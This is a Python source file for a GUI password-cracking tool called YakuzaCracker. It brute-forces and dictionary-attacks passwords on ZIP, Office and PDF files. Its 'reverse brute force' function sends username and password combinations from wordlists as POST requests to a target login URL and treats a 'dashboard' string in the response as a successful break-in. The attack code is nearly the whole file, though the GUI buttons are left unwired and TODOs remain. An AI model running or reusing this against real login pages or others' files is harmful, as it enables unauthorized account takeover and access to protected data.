""" YakuzaCracker - an Advanced GUI Tool for Cracking ZIP, RAR and MS-Office Documents,
    Also yakuzaCracker can Perform Reverse Bruteforce Attacks to Crack the Login Pages on the http and https.

Author: Davood Yakuza from Iran, Isfahan
Last Update: 29/10/2024 --- 8 aban 1403"""


# Step 1: Import all Requires Libraries
# Internal Modules
import sys
from os import path
from time import time
from string import ascii_lowercase
from io import BytesIO
import logging
import threading
from itertools import product
from concurrent.futures import ThreadPoolExecutor, as_completed

from tkinter import ttk, filedialog, scrolledtext, messagebox, Tk, StringVar, Label, WORD, BOTH, HORIZONTAL, X, END

# External Modules
from msoffcrypto import OfficeFile
from pyzipper import AESZipFile
from PyPDF2 import PdfReader
from colorama import init
from tqdm import tqdm
from tabulate import tabulate
from PIL import Image, ImageTk
from requests import post



# Step 4 from Part2: Function to Get the Path to Bundled Resources in PyInstaller
def resource_path(relative_path):
    try:
        # if gui.py bundled with PyInstaller,
        # to get the current path of where gui.py run in there, we should use sys._MEIPASS
        if hasattr(sys, "_MEIPASS"):
            basePath = sys._MEIPASS     # noqa

        # if a python file runs in the IDE or Console, then to get the current path of where gui.py run in there,
        # We should use __file__ in the dirname(abspath(__file__))
        else:
            basePath = path.dirname(path.abspath(__file__))

    except Exception:   # noqa
        basePath = path.abspath(".")

    return path.join(basePath, relative_path)


""" Part 1: Building GUI Functions and Other Objects"""

# Step 2: Initialize the Main Window
root = Tk()
root.title("Yakuza Cracker")
# root.geometry("800x700")


# Step 4: Set the Icon for the Window
# open logo.png using resource_path()
logo = Image.open(resource_path("img/logo.png"))

# resize logo.png
logo = logo.resize((64, 64), Image.LANCZOS) # noqa

# Prepare Logo image to use in the tkinter UI
logo = ImageTk.PhotoImage(logo)

# Set Logo in the main gui
root.iconphoto(False, logo) # noqa

# Step 5: Create the Main Frame
mainFrame = ttk.Frame(root, padding="10")
mainFrame.grid(row=0, column=0, sticky="nsew")


# Step 6: Configure styles for the UI components
# Create style Instance
style = ttk.Style()

# Configure new style for Labels in named TLabel
style.configure("TLabel", background="#05050F", foreground="#FFD700")

# Configure new style for Frames in named TFrame
style.configure("TFrame", background="#05050F")

# Configure new style for Buttons in named TButton
style.configure("TButton", background="black", foreground="red", bordercolor="#009933",
                focusthickness=3, focuscolor="None")

# Configure new style for Horizontal Progressbar in named Green.Horizontal.TProgressbar
style.configure("Green.Horizontal.TProgressbar",troughcolor="#151525", background="#00FF00", bordercolor="05050F")


# Step 7: Add the attack type selection components

# Create String Variable to store brute_force
attackTypeVar = StringVar(value="brute_force")

# Create Label in main_frame with text => Select Attack Type:
attackTypeLabel = Label(mainFrame, text="Select Attack Type:", font=("Courier New", 12))

# Set Position of Label in the Main Frame
attackTypeLabel.grid(row=0, column=0, pady=5, padx=5, sticky="w")

# Create new Combobox to show attack_type_var(brute_force) as first item
attackTypeMenu = ttk.Combobox(mainFrame, textvariable=attackTypeVar, state="readonly", font=("Consolas", 12))

# Create Values of the Combobox
attackTypeMenu["values"] = ("brute_force", "dictionary", "reverse_brute_force")

# Set position of Combobox in the Main Frame
attackTypeMenu.grid(row=0, column=1, pady=5, padx=(0, 5), sticky="w")


# Step 8: Add the file type selection frame
# Create ttk.Frame with TFrame style
fileTypeFrame = ttk.Frame(mainFrame, style="TFrame")

# Create Label for file type selection
fileTypeLabel = Label(fileTypeFrame, text="Select File Type:", font=("Courier New", 12))

# Set Label Position on the UI
fileTypeLabel.grid(row=0, column=0, pady=5, padx=5, sticky="w")

# Create StringVar to store the first item of Combo Box => 'zip'
fileTypeVar = StringVar(value="zip")

# Create Combo Box in the fileTypeFrame with fileTypeVar(zip)
fileTypeMenu = ttk.Combobox(fileTypeFrame, textvariable=fileTypeVar, state="readonly", font=("Consolas", 12))

# Create other Value's of Combo Box
fileTypeMenu["values"] = ("zip", "xls", "doc", "pdf")

# Set Position of fileTypeMenu and fileTypeFrame
fileTypeMenu.grid(row=0, column=1, pady=5, padx=(0, 5), sticky="w")
fileTypeFrame.grid(row=1, column=0, columnspan=3, pady=5, padx=5, sticky="ew")


# Step 9: Add the brute force configuration frame

# Step 9.1: Create brute force frame
bruteForceFrame = ttk.Frame(mainFrame, style="TFrame")

# Step 9.2: Create Label for brute force frame
ttk.Label(bruteForceFrame, text="FilePath:", font=("Courier New", 12)).grid(row=2, column=0, pady=5, padx=5, sticky="w")

# Step 9.3: Create File Path Entry
filePathEntry = ttk.Entry(bruteForceFrame, width=40, font=("Consolas", 12), background="#151525", foreground="red")
filePathEntry.grid(row=2, column=1, pady=5, padx=5, sticky="w")

# Step 9.4: Create a Browse Button
ttk.Button(bruteForceFrame, text="Browse", style="TButton").grid(row=2, column=2, pady=5, padx=5, sticky="w")

# Step 9.5: Create MAX Length Label
ttk.Label(bruteForceFrame, text="Max Length:", font=("Courier New", 12)).grid(row=3, column=0, pady=5, padx=5, sticky="w")

# Step 9.6: Create MAX Length Entry
maxLengthEntry = ttk.Entry(bruteForceFrame, width=10, font=("Consolas", 12), background="#151525", foreground="red")
maxLengthEntry.grid(row=3, column=1, pady=5, padx=5, sticky="w")

# Step 9.7: Create Charset Label
ttk.Label(bruteForceFrame, text="Charset:", font=("Courier New", 12)).grid(row=4, column=0, pady=5, padx=5, sticky="w")

# Step 9.8: Create Charset Entry
charsetEntry = ttk.Entry(bruteForceFrame, width=40, font=("Consolas", 12), background="#151525", foreground="red")
charsetEntry.grid(row=4, column=1, pady=5, padx=5, sticky="w")


# Step 10: Add the Dictionary Attack Configuration Frame

# Step 10.0: Create Dictionary Attack Frame
dictionaryFrame = ttk.Frame(mainFrame, style="TFrame")

# Step 10.1: Create File Path Label
ttk.Label(dictionaryFrame, text="File Path:", font=("Courier New", 12)).grid(row=2, column=0, pady=5, padx=5, sticky="w")

# Step 10.2: Create File Path Entry
filePathEntryDict = ttk.Entry(dictionaryFrame, width=40, font=("Consolas", 12), background="#151525", foreground="red")
filePathEntryDict.grid(row=2, column=1, pady=5, padx=5, sticky="w")

# Step 10.3: Create Browse Button
ttk.Button(dictionaryFrame, text="Browse", style="TButton").grid(row=2, column=2, pady=5, padx=5, sticky="w")

# Step 10.4: Create Dictionary File Label
ttk.Label(dictionaryFrame, text="Dictionary File:", font=("Courier New", 12)).grid(row=3, column=0, pady=5, padx=5, sticky="w")

# Step 10.5: Create Dictionary File Entry
dictionaryFileEntry = ttk.Entry(dictionaryFrame, width=40, font=("Consolas", 12), background="#151525", foreground="red")
dictionaryFileEntry.grid(row=3, column=1, pady=5, padx=5, sticky="w")

# Step 10.6: Create Browse Button
ttk.Button(dictionaryFrame, text="Browse", style="TButton").grid(row=3, column=2, pady=5, padx=5, sticky="w")


# Step 11: Add the Reverse Bruteforce Attack Configuration Frame
# Step 11.0: Create Reverse Bruteforce Attack Frame
reverseBruteForceFrame = ttk.Frame(mainFrame, style="TFrame")

# Step 11.1: Create Target URL Label
ttk.Label(reverseBruteForceFrame, text="Target URL:",
          font=("Courier New", 12)).grid(row=2, column=0, pady=5, padx=5, sticky="w")

# Step 11.2: Create Target URL Entry
urlEntry = ttk.Entry(reverseBruteForceFrame, width=40, font=("Consolas", 12), background="#151525", foreground="red")
urlEntry.grid(row=2, column=1, pady=5, padx=5, sticky="w")

# Step 11.3: Create Usernames File Label
ttk.Label(reverseBruteForceFrame, text="Usernames File:", font=("Courier New", 12)).grid(row=3, column=0, pady=5, padx=5, sticky="w")

# Step 11.4: Create Usernames File Entry
usernamesFileEntry = ttk.Entry(reverseBruteForceFrame, width=40, font=("Consolas", 12), background="#151525", foreground="red")
usernamesFileEntry.grid(row=3, column=1, pady=5, padx=5, sticky="w")

# Step 11.5: Create Username File Browse Button
ttk.Button(reverseBruteForceFrame, text="Browse", style="TButton").grid(row=3, column=2, pady=5, padx=5, sticky="w")

# Step 11.6: Create Passwords File Label
ttk.Label(reverseBruteForceFrame, text="Common Passwords File:",
          font=("Courier New", 12)).grid(row=4, column=0, pady=5, padx=5, sticky="w")

# Step 11.7: Create Passwords File Entry
commonPasswordFileEntry = ttk.Entry(reverseBruteForceFrame, width=40,
                                    font=("Consolas", 12), background="#151525", foreground="red")
commonPasswordFileEntry.grid(row=4, column=1, pady=5, padx=5, sticky="w")

# Step 11.8: Create Browse Password File Button
ttk.Button(reverseBruteForceFrame, text="Browse", style="TButton").grid(row=4, column=2, pady=5, padx=5, sticky="w")


# Step 12: Add the Run, Stop and Clear Buttons
ttk.Button(mainFrame, text="Run", style="TButton", width=15).grid(row=5, column=0, pady=10, padx=5, sticky="ew")
ttk.Button(mainFrame, text="Stop", style="TButton", width=15).grid(row=5, column=1, pady=10, padx=5, sticky="ew")
ttk.Button(mainFrame, text="Clear", style="TButton", width=15).grid(row=5, column=2, pady=10, padx=5, sticky="ew")


# Step 13: Create the Progress Display and Output Display

# Step 13.1: StringVars to store Progress and table results
progressVar = StringVar()
tableVar = StringVar()

# Step 13.2: Create Label for show progressVar in the mainFrame
ttk.Label(mainFrame, textvariable=progressVar, wraplength=700,
          font=("Courier New", 12)).grid(row=6, column=0, columnspan=3,  pady=10, padx=10, sticky="ew")

# Step 13.3: Create Output Frame and set it on the Row 7 with 3 Column Span
outputFrame = ttk.Frame(mainFrame, style="TFrame")
outputFrame.grid(row=7, column=0, columnspan=3, pady=10, padx=10, sticky="ew")

# Step 13.4: Create Progress Logs Label
ttk.Label(outputFrame, text="Progress Logs:", font=("Courier New", 12)).pack(anchor="w")

# Step 13.5: Output Logs Scrolled Text
outputLogs = scrolledtext.ScrolledText(outputFrame, height=10, wrap=WORD, bg="#05050F", fg="#FFD700", font=("Consolas", 10))
outputLogs.pack(fill=BOTH, expand=True)

# Step 13.6: Create Result Log Label
ttk.Label(outputFrame, text="Results Log:", font=("Courier New", 12)).pack(anchor="w")

# Step 13.7: Result Logs Scrolled Text
resultLogs = scrolledtext.ScrolledText(outputFrame, height=10, wrap=WORD, bg="#05050F", fg="#FFD700", font=("Consolas", 10))
resultLogs.pack(fill=BOTH, expand=True)

# Step 13.8: Create Progress Bar to Show Taken/Estimated Percentage of the Cracking Attack in the outputFrame
progressBar = ttk.Progressbar(outputFrame, orient=HORIZONTAL, length=700, mode="determinate", style="Green.Horizontal.TProgressbar")
progressBar.pack(fill=X, pady=5)

# Step 13.9: Create Percentage Text Label
progressLabel = Label(outputFrame, text="Progress: 0%", bg="#05050F", fg="#FFD700", font=("Courier New", 12))
progressLabel.pack()

# Step 13.10: Create Estimated Time Remaining Label
etaLabel = Label(outputFrame, text="Estimated Time Remaining: N/A", bg="#05050F", fg="#FFD700", font=("Consolas", 12))
etaLabel.pack()


# Step 14: Set the column configurations
root.grid_columnconfigure(0, weight=1)
mainFrame.grid_columnconfigure(0, weight=1)
mainFrame.grid_columnconfigure(1, weight=1)
mainFrame.grid_columnconfigure(2, weight=1)
outputFrame.grid_columnconfigure(0, weight=1)




""" Part 2: Building Application Functions, Classes, Utilities """
# Step 1: Initialize colorama for colored console output
init()

# Step 2: Setup logging configuration
logging.basicConfig(filename="yakuza_cracker.log", level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')


# Step 3: Define global variables
stopFlag = False    # stopFlag used to stop the cracking process

results = []    # result's list use to store the cracked(founded) passwords


""" Section 2: Developing Utility Functions """

# Step 5: Function to Try a Password on Different File Types
def try_password(file_path, file_type, password):
    logging.info(f"[+] Trying password: {password}")
    
    try:
        # If the file is an Office file, then execute try_office_password
        if file_type in ['xls', 'xlsx', 'doc', 'docx']:
            return try_office_password(file_path, password)

        # If the file is ZIP File, then execute try_zip_password()
        elif file_type == 'zip':
            return try_zip_password(file_path, password)

        # If the file is PDF File, then execute try_pdf_password()
        elif file_type == 'pdf':
            return try_pdf_password(file_path, password)

        else:
            logging.error("[-] Unsupported file type.")
            return False

    except Exception as e:
        logging.error(f"[-] Error Trying password: {password} | Error: {e}")
        return False

# Step 6: Define a function to try passwords on MS Office files
def try_office_password(file_path, password):
    # Read Office file
    with open(file_path, 'rb') as f:
        file = OfficeFile(f)
        file.load_key(password=password)

        with BytesIO() as decrypted:
            file.decrypt(decrypted)
            return True

# Step 7: Function to try passwords on ZIP files
def try_zip_password(file_path, password):
    # Open the ZIP file and attempt to extract it using pyzipper
    with AESZipFile(file_path) as zf:
        zf.extractall(pwd=password.encode('utf-8'))
        return True

# Step 8: Function to try passwords on PDF files
def try_pdf_password(file_path, password):
    # Open the PDF file and attempt to decrypt it using PyPDF2
    reader = PdfReader(file_path)

    # if the PDF file is encrypted, then decrypt it using the provided password
    if reader.is_encrypted:
        reader.decrypt(password)
        reader.pages[0]
        return True

    return False


# Step 9: Function for Perform Multithreading Password Cracking Attempts
def attempt_passwords(file_path, file_type, passwords, results, batch_index): # noqa
    for password in passwords:
        if try_password(file_path, file_type, password):
            results[batch_index] = (password, "Success")
            return password
        else:
            results[batch_index] = (password, "Unsuccessful")
    return None


# Step 10: Define a function to determine the file type based on the file extension
def get_file_type(file_path):
    extension = path.splitext(file_path)[1].lower()

    if extension in ['.xls', '.xlsx']:
        return 'xls'

    elif extension in ['.doc', '.docx']:
        return 'doc'

    elif extension == '.zip':
        return 'zip'

    elif extension == '.pdf':
        return 'pdf'

    else:
        return None


# Step 11: Define a function to read file lines with fallback encoding and error handling
def read_file_lines(file_path):
    encodings = ['utf-8', 'latin-1', 'ascii']

    # Open file_path with all encodings and then return files line by line, if encoding its wrong try next encoding
    for encoding in encodings:
        try:

            with open(file_path, 'r', encoding=encoding, errors='ignore') as file:
                return [line.strip() for line in file.readlines()]


        except UnicodeDecodeError:
            continue

    raise ValueError(f"Failed to decode file {file_path} with tried encodings.")



""" Section 3: UI Update Functions"""
# Step 12: Define a function to update the progress message
def update_progress(message):
    progressVar.set(message)

# Step 12.1: Define a function to update the main log
def update_log(message):
    outputLogs.insert(END, message + '\n')
    outputLogs.see(END)

# Step 12.2: Define a function to update the result log
def update_result_log(message, success=False):
    if success:
        resultLogs.tag_configure("success", foreground="green")
        resultLogs.insert(END, message + '\n', "success")
    else:
        resultLogs.insert(END, message + '\n')

    resultLogs.see(END)


# Step 12.3: Define a function to update the progress bar and ETA Label
def update_progress_bar(current, total, start_time):
    # Calculate the Percentage of Attack Progress
    progressPercentage = min(100, (current / total) * 100)
    progressBar['value'] = progressPercentage

    # Config Progress Bar Label
    progressLabel.config(text=f"Progress: {progressPercentage:.2f}%")

    # Calculate the time elapsed since the start of the attack
    elapsedTime = time() - start_time

    if 0 < current < total:
        # Calculate the estimated total time and remaining time
        estimatedTotalTime = elapsedTime * total / current
        estimatedRemainingTime = estimatedTotalTime - elapsedTime

        # Set the ETA label
        etaLabel.config(text=f"Estimated Time Remaining: "
                             f"{int(estimatedRemainingTime // 60)} min {int(estimatedRemainingTime % 60)} sec")

    # if time attack time finished, then set the ETA label to 0 min 0 sec
    elif current >= total:
        etaLabel.config(text="Estimated Time Remaining: 0 min 0 sec")

    # Update the progress bar and ETA label
    root.update_idletasks()


# Step 12.4: Define a function to summarize the results and update the log
def summary_results():
    global results

    if results:
        # Create table from results with 3 columns: Attempt, Password, Status
        summaryTable = tabulate(results, headers=["Attempt", "Password", "Status"], tablefmt="grid")

        update_result_log(f"\nSummary of findings:\n{summaryTable}")
        update_progress("Attack stopped and Results summarized into table.")
        logging.info("[+] Attack stopped and Results summarized into table.")


# Step 12.5: Define a function to clear the attack results and reset the UI
def clear_attack():
    global stopFlag, results

    # Reinitialize Global Variables
    stopFlag = False
    results = []

    # Reinitialize UI Variables
    progressVar.set("")
    outputLogs.delete(1.0, END)
    resultLogs.delete(1.0, END)

    # Reinitialize the Progress Bar and ETA
    progressBar['value'] = 0
    progressLabel.config(text="Progress: 0%")
    etaLabel.config(text="Estimated Time Remaining: N/A")

    # Submit Log for Reinitialization
    logging.info("[+] Attack Cleared, All Objects Reinitialized.")


""" Section 4: Define Attack Functions """

# Step 14: Define Bruteforce Attack Function
def brute_force_attack(file_path, file_type, max_length=6, charset=ascii_lowercase):
    global results

    try:
        # Initialize Variables needs for Attack
        startTime = time()      #Record the start time
        attemptCounter = 0      #Initialize the attempt counter
        results = []            #Initialize the result list

        # Calculate Total Attempts
        totalAttempts = sum(len(charset) ** i for i in range(1, max_length + 1))

        # Open Progress Bar synced to Bruteforce Attack
        with tqdm(total=totalAttempts, desc="Bruteforce Progress", unit="attempt", dynamic_ncols=True) as pbar:

            # iterate through each password length
            for length in range(1, max_length + 1):

                # Generate all combinations of the given length to try as Password
                for attempt in product(charset, repeat=length):

                    # Check if the stop flag is set, update progress bar and submit log, then call summary_result()
                    if stopFlag:
                        update_progress("Progress Interrupted by the User.")
                        logging.info("[+] Progress Interrupted by the User.")
                        summary_results()
                        return None

                    # Join the characters to form a password & Increment the attempt counter
                    password = ''.join(attempt)
                    attemptCounter += 1

                    # Try the generated password with try_password()
                    if try_password(file_path, file_type, password):
                        endTime = time()    # Record the end time

                        # Append successful password attempts to the result list
                        results.append([attemptCounter, password, "Success"])

                        # Create table from founded passwords(Result list)
                        table = tabulate(results, headers=["Attempt", "Password", "Status"], tablefmt="grid")

                        # Update Log and Result Logs with founded password table
                        update_log(table)
                        update_result_log(f"Password found: {password} for file: {file_path}\nTime taken: "
                                          f"{endTime - startTime} seconds\nAttempts made: {attemptCounter}", success=True)

                        # Submit log for finding password, time taken, max attempts
                        logging.info(f"[+] Password found: {password}")
                        logging.info(f"[+] Time taken: {endTime - startTime} seconds")
                        logging.info(f"[+] Attempts made: {attemptCounter}")

                        # Update Progress Bar, ETA Label, idletask and return password
                        update_progress_bar(totalAttempts, totalAttempts, startTime)
                        etaLabel.config(text="Estimated Time Remaining: 0 min 0 sec")
                        root.update_idletasks()
                        return password

                    # Update the progress bar
                    pbar.update(1)

                    # Append unsuccessful attempt
                    results.append([attemptCounter, password, "Unsuccessful"])

                    # Create table from the last 100 attempts to submit it into Log Section
                    table = tabulate(results[-100:], headers=["Attempt", "Password", "Status"], tablefmt="grid")
                    update_log(table)

                    # Update the Progress bar
                    update_progress_bar(attemptCounter, totalAttempts, startTime)
                    root.update_idletasks()

        # if password not founded, update_results_log, Submit Log & update progress bar
        update_result_log("[-] Password not found.")
        logging.info("[-] Password not found.")
        update_progress_bar(totalAttempts, totalAttempts, startTime)

    # Handle CTRL+C(KeyboardInterrupt) to Stop Process & call summary_results()
    except KeyboardInterrupt:
        update_progress("Process interrupted by user.")
        logging.info("[+] Process interrupted by user.")
        summary_results()

    return None


# Step 15: Define the dictionary attack function
def dictionary_attack(file_path, file_type, dictionary_file):
    global results

    try:
        # Initialize Variables needs for Attack
        startTime = time()      #Record the start time
        attemptCounter = 0      #Initialize the attempt counter
        results = []            #Initialize the result list

        # try to Read passwords from the dictionary file with Error Handling
        try:
            password = read_file_lines(dictionary_file)
        except FileNotFoundError:
            update_progress(f"[-] Dictionary file '{dictionary_file}' not found.")
            logging.info(f"[-] Dictionary file '{dictionary_file}' not found.")
            return None
        except ValueError as e:
            update_progress(f"[-] Value Error: {str(e)}")
            logging.info(f"[-] Value Error: {str(e)}")
            return None

        # Calculate total attempts and Initialize the password founded flag
        totalAttempts = len(password)
        passwordFound = False

        # Create Thread Pool to Perform Multithreading Attack
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = []

            # Open Progress Bar
            with tqdm(total=totalAttempts, desc="Dictionary Attack Progress", unit="attempt", dynamic_ncols=True) as pbar:
                # Process passwords in batches of 10
                for i in range(0, totalAttempts, 10):
                    # if a password is founded or stop a flag is set break loop
                    if passwordFound or stopFlag:
                        break

                    batch = password[i:i + 10]

                    # Create the executor and submit it, then append future to it
                    future = executor.submit(attempt_passwords, file_path, file_type, batch, results, i)
                    futures.append(future)

                    # Increment the attempt counter by batch size and update progress bar
                    attemptCounter += len(batch)
                    pbar.update(len(batch))

                    # Append Unsuccessful Attempts to results list
                    results.extend([[i + j, pw, "Unsuccessful"] for j, pw in enumerate(batch)])

                    # Create table from Founded Password and Update Log with table
                    table = tabulate(results[-100:], headers=["Attempt", "Password", "Status"], tablefmt="grid")

                    # Update Log with table, Progress Bar & Update idletask
                    update_log(table)
                    update_progress_bar(attemptCounter, totalAttempts, startTime)
                    root.update_idletasks()

                # Check results of futures
                for future in as_completed(futures):
                    password = future.result()

                    # Check if password founded
                    if password:
                        # Set password found flag
                        passwordFound = True # noqa
                        endTime = time()    # Record the end time

                        # Append successful attempt
                        results.append([attemptCounter, password, "Success"])

                        # Create table from founded passwords
                        table = tabulate(results, headers=["Attempt", "Password", "Status"], tablefmt="grid")

                        # Update log & results Log sections
                        update_log(table)
                        update_result_log(f"Password found: {password} for file: {file_path}\nTime taken: "
                                          f"{endTime - startTime} seconds\nAttempts made: {attemptCounter}", success=True)

                        # Submit Logs for founded password, times taken, Attempts made, Estimated Remaining Time
                        logging.info(f"[+] Password found: {password}")
                        logging.info(f"[+] Time taken: {endTime - startTime} seconds")
                        logging.info(f"[+] Attempts made: {attemptCounter}")

                        # Update Progress bar, ETA Label, idletask and return password
                        update_progress_bar(totalAttempts, totalAttempts, startTime)
                        etaLabel.config(text="Estimated Time Remaining: 0 min 0 sec")
                        root.update_idletasks()
                        return password

                    # if stop flag set, calling summary_results()
                    if stopFlag:
                        summary_results()
                        return None
                    # Increment the attempt counter
                    attemptCounter += 1

                    # Update progress bar
                    pbar.set_postfix({"Attempts": attemptCounter})

                    # Create table and Update Log with table
                    table = tabulate(results[-100:], headers=["Attempt", "Password", "Status"], tablefmt="grid")
                    update_log(table)

                    # Update Progress bar and idletask
                    update_progress_bar(attemptCounter, totalAttempts, startTime)
                    root.update_idletasks()

        # If password not found, first update Results Log then submit logging and update Progress Bar
        update_result_log("[-] Password not found.")
        logging.info("[-] Password not found.")
        update_progress_bar(totalAttempts, totalAttempts, startTime)

    # Handle CTRL+C(KeyboardInterrupt) for Canceling Attack
    except KeyboardInterrupt:
        # If CTRL+C pressed, Update progress bar and submit log info, finally call summary_result()
        update_progress("Process interrupted by user.")
        logging.info("[+] Process interrupted by user.")
        summary_results()

    return None


# Step 16: Define the reverse brute force attack function
def reverse_brute_force(url, username_file, common_password_file):
    global results
    foundLogins = []

    try:
        # Initialize Variables need it for the attack
        startTime = time()     # Record the start time
        results = []           # Initialize the result list
        successLogins = []     # Initialize the success logins list

        # Try to Read a common passwords file with Error Handling
        try:
            commonPasswords = read_file_lines(common_password_file)
            update_progress(f"[+] Common Password file '{common_password_file}' Loaded Successfully.")

        except FileNotFoundError:
            update_progress(f"[-] Common Password file '{common_password_file}' Not Found!")
            return None

        except ValueError as e:
            update_progress(f"[-] Error while reading Common Password file: {str(e)}")
            return None

        # Try to Read a username file with Error Handling
        try:
            usernames = read_file_lines(username_file)
            update_progress(f"[+] Username file '{username_file}' Loaded Successfully.")

        except FileNotFoundError:
            update_progress(f"[-] Username file '{username_file}' Not Found!")
            return None

        except ValueError as e:
            update_progress(f"[-] Error while reading Username file: {str(e)}")
            return None

        # Initialize the attempt counter and Calculate total attempts
        attemptCounter = 0
        totalAttempts = len(usernames) * len(commonPasswords)

        # Open a Progress Bar to Perform Reverse bruteforce synced by Progress bar
        # Reverse Bruteforce Attack Codes write in the below 'with' Block
        with tqdm(total=totalAttempts, desc="Reverse Brute Force Progress", unit="attempt", dynamic_ncols=True) as pbar:

            # Iterate on All Password to Try with Usernames which read from the username file
            for password in commonPasswords:
                for username in usernames:

                    # If User cancels Attack, summary_result and return None
                    if stopFlag:
                        update_progress("[-] Process interrupted by User.")
                        logging.info("[-] Process interrupted by User.")
                        summary_results()
                        return None

                    # If a user flag doesn't set, start the Attack Process.
                    # First, Increment the attempt counter
                    attemptCounter += 1

                    # TODO: Add Some Payload Data format, to send basically on the target server, for example:
                    #               firs check targets payload with condition, and then fill payload like
                    #               {'user': username, 'pass': password}
                    #Send login POST request with read username and the password as Payload Data
                    response = post(url, data={'username': username, 'password': password})


                    # TODO: Add Some Conditions for Success Login Checking for example:
                    #               Check if the response is successful (status code 200),
                    #               Check 'success' in response.json() or Check 'success' in response.text()

                    # If 'Dashboard' in response.text Mean password founded
                    if 'dashboard' in response.text:
                        endTime = time() # record the end time

                        # Append successful attempt to results
                        results.append([attemptCounter, username, password, "Success", endTime - startTime])

                        # Append successful login to success_logins
                        successLogins.append((username, password, attemptCounter, endTime - startTime))

                        # Append found login to found_logins
                        foundLogins.append([attemptCounter, username, password, endTime - startTime])

                        # Create tabulate table for found logins
                        table = tabulate(foundLogins,
                                         headers=["Attempt", "Username", "Password", "Time Taken"], tablefmt="grid")

                        # Update the Result Log Section and Log Section with Founded Table
                        update_log(f"\nFounded Logins:\n{table}")
                        update_result_log(f"Password found: {password} for username: {username}\nTime taken: "
                                          f"{endTime - startTime} seconds\nAttempts made: {attemptCounter}", success=True)

                        # Submit Logs for Password founded, Time Taken and Attempts made
                        logging.info(f"[+] Password found: {password} for username: {username}")
                        logging.info(f"[+] Time taken: {endTime - startTime} seconds")
                        logging.info(f"[+] Attempts made: {attemptCounter}")

                    # Else, append unsuccessful attempt to results
                    else:
                        results.append([attemptCounter, username, password,"Unsuccessful"])

                    # Update the progress bar
                    pbar.update(1)

                    # Create Table from last 100 items of results
                    table = tabulate(results[-100:],
                                     headers=["Attempt", "Username", "Password", "Status"], tablefmt="grid")

                    # Update Log Section with Table
                    update_log(table)

                    # Update Progress Bar synced by Try Attempts then update idletask
                    update_progress_bar(attemptCounter, totalAttempts, startTime)
                    root.update_idletasks()

        # if Correct Username/Password(account) found
        if successLogins:

            # Create a table for success logins
            summaryTable = tabulate(successLogins,
                                     headers=["Username", "Password", "Attempts", "Time Taken"], tablefmt="grid")
            # Update result log and Submit Info Log from summary_table
            update_result_log(f"\nSummary of found logins:\n{summaryTable}")
            logging.info(f"[+] Summary of found logins:\n{summaryTable}")

        # Else, Mean not found any account
        else:
            # Update result log and Submit Info Log for Password/Username Not founded
            update_result_log("[-] Password not found for any username.")
            logging.info("[-] Password not found for any username.")

        # Update Progress bar synced by Attempts
        update_progress_bar(totalAttempts, totalAttempts, startTime)


    # If user pressed CTRL+C, Submit Interrupt Progress and Logs then summary results
    except KeyboardInterrupt:
        update_progress("[-] Process interrupted by User.")
        logging.info("[-] Process interrupted by User.")
        summary_results()

    return None
























def test():
    # print(path.splitext(__file__)[1].lower())
    print(read_file_lines(__file__))

# if __name__ == "__main__":
#     test()

# Step 15: Main Execution with Automatic Window Resizing
if __name__ == "__main__":
    root.update_idletasks()
    root.minsize(root.winfo_width(), root.winfo_height())
    root.mainloop()





















